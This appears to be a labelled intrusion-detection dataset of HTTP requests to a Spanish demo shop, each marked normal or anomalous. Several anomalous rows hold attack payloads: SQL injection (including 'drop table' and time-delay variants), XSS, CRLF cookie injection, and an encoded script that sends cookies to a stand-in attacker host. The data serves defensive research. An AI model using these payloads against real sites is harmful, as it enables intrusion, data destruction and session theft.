"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = vernon & password = fru3t051i3 & nombre = gali & apellidos = gombau & email = hamlay @ ballerpoker . coop & dni = 07701226k & direccion = c /  + antonio + maura ,  + 76 ,  + 10 ? b & ciudad = cañada + de + verich ,  + la & cp = 46473 & provincia = zaragoza & ntc = 718029984693103 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = nevinbob % 40 % 3cscript % 3ealert % 28paros % 29 % 3c % 2fscript % 3e . parosproxy . org & pwd = desgraduar & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = madhukar & password = 95lez3397e & nombre = isabela & apellidos = bencomo + urdaniz & email = dor @ velazquezlarranaga . ar & dni = 63919065h & direccion = c /  + san + diego + de + alcala + 156 + 8 ? c & ciudad = nigüella & cp = 18699 & provincia = girona & ntc = 7197438331270925 & b1 = registrarsessionid = 12312312 &  + username =  % 3c % 73 % 63 % 72 % 69 % 70 % 74 % 3e % 64 % 6f % 63 % 75 % 6d % 65 % 6e % 74 % 2e % 6c % 6f % 63 % 61 % 74 % 69 % 6f % 6e % 3d % 27 % 68 % 74 % 74 % 70 % 3a % 2f % 2f % 61 % 74 % 74 % 61 % 63 % 6b % 65 % 72 % 68 % 6f % 73 % 74 % 2e % 65 % 78 % 61 % 6d % 70 % 6c % 65 % 2f % 63 % 67 % 69 % 2d % 62 % 69 % 6e % 2f % 63 % 6f % 6f % 6b % 69 % 65 % 73 % 74 % 65 % 61 % 6c % 2e % 63 % 67 % 69 % 3f % 27 % 2b % 64 % 6f % 63 % 75 % 6d % 65 % 6e % 74 % 2e % 63 % 6f % 6f % 6b % 69 % 65 % 3c % 2f % 73 +  % 63 % 72 % 69 % 70 % 74 % 3e ? ,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = hering & password = si1 _ ar & nombre = sofía & apellidos = solàs + cachiner & email = straight @ tobarisch . kz & dni = 11103890l & direccion = calle + trafalgar + s / n ,  + 2 - c & ciudad = paredes + de + sigüenza & cp = 05416 & provincia = baleares +  ( illes )  & ntc = 4602024078447794 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / entrar . jsp ? errormsg = credenciales + incorrectas % 2b,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1any % 0aset - cookie % 3a + tamper % 3d1041264011025374727 & nombre = jamón + ibérico & precio = 100 & cantidad = 35 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1764 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar ' or ' a =  ' a & precio = 5756 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1008 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = cottengi & password = apendicul9r & nombre = amiel & apellidos = ponsatí + lemunao & email = innis . yarbrough @ fuzzy . kz & dni = 80966763r & direccion = calle + juan + duque + 169 + 4 ? d & ciudad = guadalix + de + la + sierra & cp = 17475 & provincia = castellón & ntc = 4315753990410491 & b1 = registrar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = saad & password = 9o6i7i9a947 & nombre = solita & apellidos = soto + jovellar & email = etaix2 @ hangartalleres . gi & dni = 92775507q & direccion = calle + gumersindo + robayna + galvan ,  + 133 ,  + 6 ? c & ciudad = barco + de + ávila ,  + el & cp = 34260 & provincia = toledo & ntc = 2516408741722266 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / entrar . jsperrormsg =  ""  + and +  "" 1 ""  =  "" 1",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = ferstl05 & password = floret7ar & nombre = agrícola & apellidos = estebane + abitera & email = schnell . briguet @ eco - pro . mp & dni = 35776530f & direccion = cariñena ,  + 187 ,  +  & ciudad = solórzano & cp = 10392 & provincia = palencia & ntc = 3946035396869059 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1050 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = matilde13 & pwd = extrema & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = bob % 40 % 3cscript % 3ealert % 28paros % 29 % 3c % 2fscript % 3e . parosproxy . org & pwd = diligencia & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = johanne & pwda = pazguat5 & remember = off & b1 = entrar,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = pubs & password =  +  & nombre = juana + del + pilar & apellidos = arias + salavedra & email = keefer - claudio @ hipermadrid . kr & dni = 24987514s & direccion = nucleo + residencial + san + carlos ,  + 5 ,  + 3 ? h & ciudad = alba + de + tormes & cp = 22896 & provincia = castellón & ntc = 2643686847847582 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = frederiq % 20 & password = carian ? cha & nombre = refael & apellidos = jané + alomar & email = taylor - young @ esposa . com . mu & dni = 78433382r & direccion = calle + jose + maria + castaño + 16 +  & ciudad = villores & cp = 49740 & provincia = cuenca & ntc = 1302864745707102 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 100 & cantidad = 27 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = withrow & pwd = coluvie & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = speedy & pwd = c50r27948a & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = alleyn & password = f5e2ón & nombre = galindo & apellidos = escardo & email = deslandes @ arroyomolinos - madrid . th & dni = 38140529c & direccion = c /  + aldeatejada ,  + 123 ,  +  & ciudad = paredes & cp = 31697 & provincia = ciudad + real & ntc = 9814280816717911 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = queso + manchego & precio = 85 & cantidad = 54 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = any % 0aset - cookie % 3a + tamper % 3d1041264011025374727 & pwd = si6bionte & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 /  & nombre = jamón + ibérico & precio = 100 & cantidad = 41 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / pagar . jsp ? modo =  < script > alert (  "" paros ""  )  ;  <  / script >  & precio = 9353 & b1 = confirmar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 7191 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 8792 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = lennard2 & pwd = bai7ío & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = tran & password = acetosa & nombre = thiago & apellidos = cisquell + agut & email = rozycki7 @ estoespresto . bw & dni = 70291181f & direccion = calle + ancha + de + santo + domingo ,  + 114 ,  +  & ciudad = lezuza & cp = 44587 & provincia = segovia & ntc = 1595911971866296 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id = 1 ' injected _ param,1
localhost : 8080 / tienda1 / publico / anadir . jspida = 2 & nombre = jamón + ibérico & precio = 100 & cantidad = 57 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = hehn - sch & password = altivo & nombre = jhesua & apellidos = urgell + raposo & email = birkhead _ kiem @ masqueclases . es & dni = 00747428c & direccion = los + ajustadores ,  + 19 + 1 ? c & ciudad = torrecilla + de + la + torre & cp = 24153 & provincia = alicante & ntc = 2121344764187847 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = rejeanne & pwd = d6917bi52to & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = erdinc & password = 3e39a62r & nombre = haroid & apellidos = peldoza + restrepo & email = dennehy @ e @ xpozarago @ zafloral2014 . ls & dni = 91385141t & direccion = calle + alhama + de + granada ,  + 164 ,  +  & ciudad = olmedilla + de + eliz & cp = 07142 & provincia = cantabria & ntc = 1803474685764017 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = denoon & password = primate & nombre = enoc & apellidos = ayjón + urmente & email = ehlers @ citiway . io & dni = 39148879g & direccion = calle + los + leñadores ,  + 2 ,  + 4 - d & ciudad = castellvell + del + campany % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 & cp = 45621 & provincia = cuenca & ntc = 5404280491396556 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = niels & password = compradiza & nombre = galileo & apellidos = ubeda + mercader & email = muscat @ deportechino . af & dni = 74404749w & direccion = enric + prat + de + la + riba ,  + 135 ,  + 2 ? f & ciudad = olula + de + castro & cp = 34407 & provincia = palencia & ntc = 6620935380391144 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón + ibérico & precio = 39 & cantidad = 17 & b1 =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  - ",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = boinnard & password = alarguez & nombre = celinda & apellidos = alberti '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & email = moriconi @ x2 . com . pro & dni = 75775962r & direccion = doña + sancha + 16 ,  +  & ciudad = montesclaros & cp = 46230 & provincia = alicante & ntc = 7573620242761583 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = sarna5 & password = !laureando & nombre = alci . a & apellidos = calera + hera & email = allenbury - nantasiri @ audiosat . az & dni = 02790010h & direccion = calle + castilleja + de + la + cuesta + 70 ,  +  & ciudad = tírvia & cp = 03638 & provincia = girona & ntc = 1446048659469569 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = ivanyi0 & password = va7e9ianato & nombre = crescencio & apellidos = echevarría + borras & email = tadio . bixby @ espaciopintor . eh & dni = 98763423c & direccion = torrent + de + can + quintana ,  + 179 ,  +  & ciudad = llocnou + de + la + corona & cp = 49430 +  & provincia = lleida & ntc = 8110791105529474 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = krishna & pwda = 3o ? 964i7a1 & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = siva0 & password = esotér2ca & nombre = fede & apellidos = romera + zuleta & email = dacgnault @ ajuntamentbarcelona2 - 0 . name & dni = 34382308e & direccion = c /  + cuellar + 177 +  ' injected _ param & ciudad = albalate + de + las + nogueras & cp = 24915 & provincia = segovia & ntc = 8975566519527853 & b1 = registrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = marasliy & password = 2org4 & nombre = mailén & apellidos = aleu + alcaide & email = laurie @ martosfutbolsala . gm & dni = 18455622p & direccion = calle + antolin + garcia ,  + s / n +  & ciudad = casasola & cp = 04810 & provincia = barcelona & ntc = 6739508429793646 & b1 = registrar",0
localhost : 8080 / tienda1 / miembros / imagenes / asf - logo - wide . gif . inc,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = abel & password = adaptadamente & nombre = ina & apellidos = quiñonero & email = hohl @ titulosoficiales . um & dni = 54525559b & direccion = calle + hermanos + gambra ,  + 157 +  & ciudad = cabezuela & cp = 09691 & provincia = teruel & ntc = 6623630296167560 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = wei & password = presen ,  /  , ciar & nombre = estefan & apellidos = tomasa + camino & email = bovell _ haygarth @ nuestrasantacruz . vu & dni = 75996092k & direccion = guadiana + s / n + 2 ? c & ciudad = ossa + de + montiel & cp = 08470 & provincia = badajoz & ntc = 4288323841686638 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = dorise & password = anv5r14 & nombre = adelmo & apellidos = escoda + begazo & email = skobline @ promotorareina . no & dni = 36354909m & direccion = c /  + matasiete ,  + 26 ,  + 2 - h & ciudad =  ""  + and +  "" 1 ""  =  "" 1 & cp = 42269 & provincia = palencia & ntc = 0173606595958509 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = gradeigh & pwd = 1lmizcler3 & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 599 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = sutherla & pwd = natri & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = absi & password = primogenitura & nombre = sem & apellidos = bettini & email = phillott @ g - audio . cf & dni = 88374981b & direccion = calle + zubia + 7 +  & ciudad = garínoain & cp = 10189 & provincia = lleida & ntca = 0957957573117060 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1124 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 82 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1715 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = ivanyi0 & password =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & nombre = crescencio & apellidos = echevarría + borras & email = tadio . bixby @ espaciopintor . eh & dni = 98763423c & direccion = torrent + de + can + quintana ,  + 179 ,  +  & ciudad = llocnou + de + la + corona & cp = 49430 & provincia = lleida & ntc = 8110791105529474 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = suilin & password = 654261itu2a & nombre = ran + gl ' e & apellidos = llens + capmany & email = fleugel @ tantomontamontatanto . lc & dni = 31564707j & direccion = glorieta + liquidambar ,  + s / n ,  + 13 ? f & ciudad = puebla + del + salvador & cp = 24438 & provincia = huelva & ntc = 2227850098385549 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodoa = insertar & precio = 1328 & b1 = pasar + por + caja,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = etienne & password = ahoga2iz8 & nombre = pastora & apellidos = aleu + alcaide & email = t @  @ sumu @ ra _ senghor @ todomodelos . aq & dni = 44544869x & direccion = giuseppe + micael ,  + 174 + 8 - h & ciudad = valdefuentes + del + páramo & cp = 06300 & provincia = ciudad + real & ntc = 5699405800944222 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = suat & password = puerta1entana & nombre = isis & apellidos = piera + atencia & email = cerini . ban @ g @ 2horas . coop & dni = 23679741e & direccion = calle + torre + dels + socors + 29 ,  + 11 ? e & ciudad = quiruelas + de + vidriales & cp = 34419 & provincia = burgos & ntc = 0825075702605085 & b1 = registrar",1
